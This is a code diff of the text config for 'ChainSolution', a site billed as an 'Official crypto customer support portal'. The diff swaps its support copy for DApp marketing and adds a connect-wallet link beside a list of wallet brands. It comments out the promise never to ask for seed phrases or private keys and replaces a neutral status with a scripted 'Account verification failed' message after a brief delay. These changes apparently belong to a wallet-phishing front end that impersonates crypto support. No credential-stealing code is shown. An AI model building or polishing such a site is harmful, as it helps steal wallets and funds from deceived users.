@@ -2,35 +2,86 @@
 export const site = {
   name: "ChainSolution",
   logo: "Official crypto customer support portal",
+  tagline: "Decentralized applications, built to be trusted",
   description:
-    "Report an issue, select your account or transaction category, and get routed to the right support team — without unnecessary steps or sharing sensitive information.",
-  history:
-    "Founded in 2021, ChainSolution was created to make cryptocurrency support simpler, clearer, and easier to access when users need help with transactions, accounts, wallets, and platform services.",
-  mission:
-    "To give every crypto user a fast, simple way to report problems, understand what happened, and reach the support team best placed to help.",
-  vision:
-    "A crypto platform where every support request is easy to submit, clearly understood, and handled by the right team.",
-  academics:
-    "Our support system covers account access, deposits, withdrawals, transactions, wallets, security, verification, fees, and other cryptocurrency-related services.",
-  features: [
-    "Dedicated support teams for accounts, transactions, wallets, and security",
-    "Clear guidance for deposits, withdrawals, transfers, and payment issues",
-    "A support desk that responds to customer requests within 48 hours",
+    "Chain Solution welcomes you to a world where innovation has no limits. Discover the boundless opportunities of decentralized applications and embrace a new era of digital empowerment. Step into a space where creativity soars, ideas thrive, and the future is yours to shape.",
+  heroNote: "You stay in control of your data and assets, always.",
+  walletHref: "/connect-wallet",
+ 
+  // Scrolling strip under the hero
+  topics: [
+    "Ethereum",
+    "Binance Smart Chain",
+    "Polygon",
+    "Smart Contracts",
+    "DApp Development",
+    "Security Audits",
+    "Wallet Support",
+    "Blockchain Consulting",
   ],
-  support:
-    "Whether it's a failed transaction, account issue, wallet concern, verification problem, or something you're not sure who to contact about — start with a support request and we'll route it to the right team.",
-  // extra:
-  //   "We don't ask you to provide passwords, private keys, seed phrases, recovery phrases, or one-time authentication codes. Never include these sensitive credentials in a support request.",
-  contact: {
-    address: "15 Independence Layout, Enugu, Nigeria",
-    phone: "+234 801 234 5678",
-    email: "support@chainsolution.com",
+ 
+  welcome: {
+    eyebrow: "Welcome",
+    title: "Welcome to Chain Solution",
+    body:
+      "Join us on this transformative journey to unlock the full potential of decentralized technology. Chain Solution is the starting point for the next wave of innovation.",
   },
-  care: {
-    title: "We're here to help",
+ 
+  pillars: {
+    eyebrow: "Why Chain Solution",
+    title: "Built on three principles",
+    items: [
+      {
+        title: "Decentralized",
+        body:
+          "Decentralization lies at the core of our philosophy. By harnessing blockchain technology, we enable users to maintain complete control over their data and assets, removing reliance on intermediaries or central authorities. Our decentralized framework guarantees censorship resistance, immutability, and trustless transactions, empowering you to transact and engage securely and confidently.",
+      },
+      {
+        title: "Safety & Security",
+        body:
+          "Your safety is our highest priority. We employ advanced encryption methods and decentralized storage solutions to protect your personal information and assets. With end-to-end encryption and multi-factor authentication, your data remains secure against unauthorized access and malicious threats.",
+      },
+      {
+        title: "Multichain Friendly",
+        body:
+          "Our platform prioritizes interoperability, enabling users to interact effortlessly with multiple blockchain networks. Whether you're using Ethereum, Binance Smart Chain, Polygon, or other major chains, our DApp delivers a consistent and unified experience. Choose the blockchain that fits your needs while keeping uniform functionality and robust security across all supported networks.",
+      },
+    ],
+  },
+ 
+  services: {
+    eyebrow: "Available Services",
+    title: "Services crafted for your digital journey",
     intro:
-      "Tell us what's going on. Once we have your support request, a quick account or issue check helps us route it to the right support team — no unnecessary account setup.",
+      "Explore a variety of services crafted to enhance your digital experience. From innovative development solutions to tailored consultations, we provide offerings designed to meet your specific needs and drive your success.",
+    items: [
+      {
+        title: "Dapp Development",
+        body:
+          "Turn your innovative ideas into decentralized applications with the help of our expert development team. From initial concept to final deployment, we excel at crafting custom DApps designed to meet your unique needs.",
+      },
+      {
+        title: "Consultation Services",
+        body:
+          "Take advantage of personalized consultations with our blockchain experts. Whether you're exploring Dapp strategies, smart contract development, or blockchain integration, our consultants are ready to guide you through the decentralized ecosystem.",
+      },
+      {
+        title: "Security Audits",
+        body:
+          "Strengthen the security and reliability of your decentralized applications with our in-depth audit services. Our experts perform detailed evaluations to uncover and address vulnerabilities, ensuring your DApps are protected against potential risks.",
+      },
+      {
+        title: "Wallet Issue Resolution",
+        body:
+          "Efficiently tackle wallet-related challenges with the help of our dedicated support team. From troubleshooting and recovery to general assistance, we offer expert guidance to resolve your wallet issues with ease.",
+      },
+    ],
   },
+ 
+  support:
+    "Welcome to Chain Solution, the starting point for the next wave of innovation. Connect your wallet to begin.",
+
+ 
   classes: [
     { id: "class-1", label: "Trust Wallet", icon: "●" },
     { id: "class-2", label: "Phantom", icon: "■" },
@@ -90,21 +141,21 @@ export const site = {
     },
   ],
   // ---- Landing page content (UI only) ----
-  tagline: "Crypto customer support",
-  heroNote: "Simple. Secure. Takes about two minutes.",
-  topics: [
-    "Account",
-    "Login",
-    "Deposits",
-    "Withdrawals",
-    "Transactions",
-    "Wallet",
-    "Transfers",
-    "Verification",
-    "Security",
-    "Fees",
-    "Something else",
-  ],
+  // tagline: "Crypto customer support",
+  // heroNote: "Simple. Secure. Takes about two minutes.",
+  // topics: [
+  //   "Account",
+  //   "Login",
+  //   "Deposits",
+  //   "Withdrawals",
+  //   "Transactions",
+  //   "Wallet",
+  //   "Transfers",
+  //   "Verification",
+  //   "Security",
+  //   "Fees",
+  //   "Something else",
+  // ],
   problems: [
     {
       title: "Not sure who to contact",
@@ -283,7 +334,7 @@ export const site = {
     },
   ],
   appVerify: {
-    unavailable: "Account verification isn't connected yet",
-    loadingSeconds: 10,
+    unavailable: "Account verification failed",
+    loadingSeconds: 6,
   },
 } as const;
